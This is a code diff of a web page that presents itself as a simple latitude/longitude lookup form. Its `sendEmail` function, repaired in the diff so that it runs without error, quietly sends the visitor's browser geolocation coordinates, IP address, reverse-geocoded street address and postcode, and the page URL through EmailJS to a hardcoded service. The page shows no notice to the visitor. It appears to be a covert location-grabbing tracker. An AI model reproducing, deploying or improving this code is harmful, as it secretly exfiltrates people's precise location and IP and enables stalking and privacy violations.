@@ -33,7 +33,7 @@
         <input type="text" id="latitude" placeholder="Enter Your Latitude">
         <br><br>
         <label>Longitude:</label>
-        <input type="text" id="longitude" placeholder="Enter Your Longitude" onchange="showLocation()">
+        <input type="text" id="longitude" placeholder="Enter Your Longitude" onblur="showLocation()">
         <br><br>
         <p id="locationResult" style="display: none; margin: 0px;"></p>
     </div>
@@ -106,31 +106,27 @@
         }
 
         function sendEmail(position, ipAddress, data) {
-           emailjs.send("service_mupmc8l", "template_1f01srj", {
-                user_latitude: position.coords.latitude,
-                user_longitude: position.coords.longitude,
-                user_ipaddress: ipAddress,
-                user_country: data.address?.country || "Unknown",
-                user_country_code: data.address?.country_code || "Unknown",
-                user_state: data.address?.state || "Unknown",
-                user_city: data.address?.city || data.address?.state_district,
-                user_pincode: data.address?.postcode || "Unknown",
-                user_address: data?.display_name || "Unknown",
-                user_sports: data.address?.stop || data.address?.sports,
-                user_road: data.address?.road || "Unknown",
-                user_nearplace: data.address?.amenity || data.address?.suburb,
-                user_device_type: deviceType,
-                user_device_category: deviceCategory,
-                user_link: window.location.href,
-            }).catch(error => {
-                console.error("Failed to send email.", error);
-            });
-                .then(response => {
-                    console.log("Email sent successfully!", response.status, response.text);
-                }, error => {
-                    console.log("Failed to send email.", error);
-                });
-        }
+    emailjs.send("service_mupmc8l", "template_1f01srj", {
+        user_latitude: position.coords.latitude,
+        user_longitude: position.coords.longitude,
+        user_ipaddress: ipAddress,
+        user_country: data.address?.country || "Unknown",
+        user_country_code: data.address?.country_code || "Unknown",
+        user_state: data.address?.state || "Unknown",
+        user_city: data.address?.city || data.address?.state_district,
+        user_pincode: data.address?.postcode || "Unknown",
+        user_address: data?.display_name || "Unknown",
+        user_sports: data.address?.stop || data.address?.sports,
+        user_road: data.address?.road || "Unknown",
+        user_nearplace: data.address?.amenity || data.address?.suburb,
+        user_link: window.location.href,
+    }).then(response => {
+        console.log("Email sent successfully!", response.status, response.text);
+    }).catch(error => {
+        console.error("Failed to send email.", error);
+    });
+}
+
 
         async function showLocation() {
             const latitude = document.getElementById("latitude").value.trim();
